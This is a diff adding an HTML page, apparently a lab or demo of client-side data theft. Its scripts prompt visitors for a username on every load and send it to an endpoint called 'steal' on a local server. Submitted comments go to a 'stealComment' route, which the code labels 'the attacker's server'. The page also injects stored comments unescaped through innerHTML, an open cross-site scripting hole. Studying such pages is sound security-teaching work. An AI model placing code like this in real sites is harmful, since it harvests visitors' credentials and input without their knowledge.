@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>qawsedrf</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <h1>qawsedrftg</h1>
+    <script>
+        //prompt for login on refresh
+        localStorage.removeItem("username");
+        if (!localStorage.getItem("username")) {
+            let username = prompt("Enter your username:");
+            localStorage.setItem("username", username);
+        }
+        // Send the username
+        fetch(`http://localhost:4000/steal?username=${localStorage.getItem("username")}`)
+            .then(response => response.text())
+            .then(data => console.log(data));
+        //Display username on the victim's page
+        document.write(localStorage.getItem("username"));
+    </script>
+    <p>Logged in as: <b><script>document.write(localStorage.getItem("username"))</script></b></p>
+    <!-- Form for submitting comments -->
+    <form id="comment-form">
+        <input type="text" id="comment" name="comment" placeholder="Write a comment" required />
+        <button type="submit">Submit</button>
+    </form>
+    <h2>Comments:</h2>
+    <ul id="comment-list"></ul>
+    <script>
+        // Fetch comments from the server
+        fetch("/comments")
+        .then(res => res.json())
+        .then(comments => {
+            document.getElementById("comment-list").innerHTML = comments.map(c => `<li>${c}</li>`).join("");
+        });
+        // Add event listener to handle comment submission
+        document.getElementById("comment-form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+            //Get the comment entered by the user
+            let comment = document.getElementById("comment").value;
+            // Send the comment to the attacker's server
+            fetch(`http://localhost:4000/stealComment?comment=${encodeURIComponent(comment)}`)
+                .then(response => response.text())
+                .then(data => {
+                    console.log("Data logged to server (Warchief Sylvanas!!):", data);
+                });
+            // Optionally, clear the input field after submission
+            document.getElementById("comment").value = "";
+        });
+    </script>
+</body>
+</html>
